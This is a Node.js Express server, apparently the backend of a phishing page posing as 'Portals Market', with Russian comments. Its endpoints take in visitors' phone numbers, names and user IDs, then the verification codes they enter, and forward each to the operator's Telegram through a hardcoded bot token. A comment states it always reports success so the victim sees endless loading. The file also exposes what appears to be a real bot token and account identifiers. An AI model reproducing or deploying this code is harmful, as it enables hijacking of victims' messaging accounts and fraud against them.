const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());

// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
const YOUR_ID = '6277925229';
const YOUR_USERNAME = '@anyaskds';

// Хранилище кодов (просто для справки, но не используем для проверки)
const codes = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Функция отправки в Telegram
function sendTelegramMessage(chatId, message) {
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            console.log(`✅ Успешно отправлено в ${chatId}`);
        } else {
            console.log(`❌ Ошибка отправки в ${chatId}: ${data.description}`);
        }
    })
    .catch(err => console.log(`❌ Ошибка fetch: ${err.message}`));
}

// ===== ЭТАП 1: Человек написал номер → ПРИХОДИТ ТОЛЬКО НОМЕР =====
app.post('/api/send-code', (req, res) => {
    const { phone, region, fullName, username, userId } = req.body;

    // Генерируем код и сохраняем его
    const code = Math.floor(100000 + Math.random() * 900000).toString();

    codes[phone] = {
        code: code,
        expires: Date.now() + 120000,
        fullName: fullName,
        username: username,
        userId: userId
    };

    console.log('📱 ПОЛУЧЕН НОМЕР');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Сгенерирован код:', code);

    // ⚡ СООБЩЕНИЕ 1: ТОЛЬКО НОМЕР
    const messagePhone = `
📱 НОВЫЙ НОМЕР!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

⏳ Ожидает ввода кода...
📅 Время: ${new Date().toLocaleString()}
    `.trim();

    // Отправляем ТОЛЬКО НОМЕР
    sendTelegramMessage(YOUR_ID, messagePhone);
    sendTelegramMessage(YOUR_USERNAME, messagePhone);

    res.json({ success: true });
});

// ===== ЭТАП 2: Человек ввел код → ПРИХОДИТ КОД (ВСЕГДА!) =====
app.post('/api/verify-code', (req, res) => {
    const { phone, code, fullName, username, userId } = req.body;

    console.log('📥 ПОЛУЧЕН КОД ОТ ПОЛЬЗОВАТЕЛЯ');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Введенный код:', code);
    console.log('👤 Имя:', fullName);

    // ⚡ СООБЩЕНИЕ 2: ВСЕГДА ОТПРАВЛЯЕМ КОД, КОТОРЫЙ ВВЕЛ ПОЛЬЗОВАТЕЛЬ
    const messageCode = `
🔑 ВВЕДЕН КОД!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🔑 Код: ${code}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

📅 Время: ${new Date().toLocaleString()}
    `.trim();

    // Отправляем КОД (ВСЕГДА!)
    sendTelegramMessage(YOUR_ID, messageCode);
    sendTelegramMessage(YOUR_USERNAME, messageCode);

    // ВСЕГДА ВОЗВРАЩАЕМ УСПЕХ, ДАЖЕ ЕСЛИ КОД НЕВЕРНЫЙ
    // ЧТОБЫ У ПОЛЬЗОВАТЕЛЯ ПОКАЗАЛАСЬ БЕСКОНЕЧНАЯ ЗАГРУЗКА
    res.json({ success: true });
});

// ===== ПОВТОРНАЯ ОТПРАВКА КОДА =====
app.post('/api/resend-code', (req, res) => {
    const { phone } = req.body;
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();

    if (codes[phone]) {
        codes[phone].code = newCode;
        codes[phone].expires = Date.now() + 120000;
    }

    console.log('🔄 ПОВТОРНАЯ ОТПРАВКА');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Новый код:', newCode);

    const message = `
🔄 ПОВТОРНЫЙ КОД

📱 Телефон: ${phone}
🔑 НОВЫЙ КОД: ${newCode}

⏳ Действителен 2 минуты
    `.trim();

    sendTelegramMessage(YOUR_ID, message);
    sendTelegramMessage(YOUR_USERNAME, message);

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`✅ Portals Market запущен: http://localhost:${PORT}`);
    console.log(`📱 Твой ID: ${YOUR_ID}`);
    console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
});